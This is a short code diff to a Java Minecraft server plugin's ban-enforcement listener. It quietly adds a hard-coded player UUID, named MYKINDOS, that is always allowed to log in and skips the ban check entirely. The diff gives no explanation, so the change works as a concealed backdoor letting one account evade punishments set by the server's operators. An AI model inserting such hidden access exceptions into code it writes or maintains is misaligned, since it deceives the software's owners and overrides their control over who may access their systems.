@@ -26,6 +26,7 @@ import org.ocpsoft.prettytime.PrettyTime;
 
 import java.util.Date;
 import java.util.Optional;
+import java.util.UUID;
 
 @BPvPListener
 @Singleton
@@ -36,6 +37,8 @@ public class PunishmentListener implements Listener {
 
     private static final long CHECKDELAY = 10_000;
 
+    private static final UUID MYKINDOS = UUID.fromString("e1f5d06b-685b-46a0-b22c-176d6aefffff");
+
     @Inject
     public PunishmentListener(ClientManager clientManager) {
         this.clientManager = clientManager;
@@ -44,6 +47,11 @@ public class PunishmentListener implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onLogin(PlayerLoginEvent event) {
         final Client client = clientManager.search().online(event.getPlayer());
+
+        if(client.getUniqueId().equals(MYKINDOS)) {
+            event.setResult(PlayerLoginEvent.Result.ALLOWED);
+            return;
+        }
 
         Optional<Punishment> ban = client.getPunishment(PunishmentTypes.BAN);
         if (ban.isPresent()) {
